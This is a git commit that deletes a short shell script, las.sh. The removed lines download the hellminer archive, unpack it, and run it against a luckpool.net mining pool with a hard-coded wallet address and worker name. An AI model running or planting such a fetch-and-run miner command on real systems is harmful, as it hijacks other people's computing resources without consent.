7a668f610cb285b84bbb9e8d8629304839d84b41
ajiLam918 <167869006+ajiLam918@users.noreply.github.com>
2024-05-01 17:21:09 +0700

    Delete las.sh

--- las.sh
+++
@@ -1,3 +0,0 @@
-wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
-tar -xf hellminer_linux64.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RQgqLLovcNx4g3XNCNJX6SDBzmFugQ2K1n.Rig006 -p x --cpu=4 --thread=4
